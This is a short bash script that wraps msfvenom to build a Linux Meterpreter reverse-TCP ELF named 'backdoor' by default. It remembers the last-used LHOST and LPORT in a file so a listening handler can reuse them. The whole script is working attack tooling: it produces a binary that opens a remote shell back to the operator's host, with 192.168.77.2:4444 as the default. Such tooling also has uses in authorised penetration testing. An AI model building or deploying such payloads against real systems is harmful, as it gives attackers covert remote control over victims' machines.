#!/usr/bin/env bash
# Linux meterpreter ELF, remembers  last LHOST/LPORT used.
# Writes those values to a shared file so the handler picks up the same ones.

state="$HOME/.msf4/last.conf"

# Start with defaults and overwrite with whatever was saved last time.
lhost="192.168.77.2"
lport="4444"
[ -f "$state" ] && . "$state"

# Keep value in brackets unless replaced.
read -rp "LHOST [$lhost]: " in; lhost=${in:-$lhost}
read -rp "LPORT [$lport]: " in; lport=${in:-$lport}
read -rp "Output file [backdoor]: " in; out=${in:-backdoor}

# Save and write so handler can read.
mkdir -p "$(dirname "$state")"
printf 'lhost=%s\nlport=%s\n' "$lhost" "$lport" > "$state"

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$out"
echo "Built $out -> $lhost:$lport"
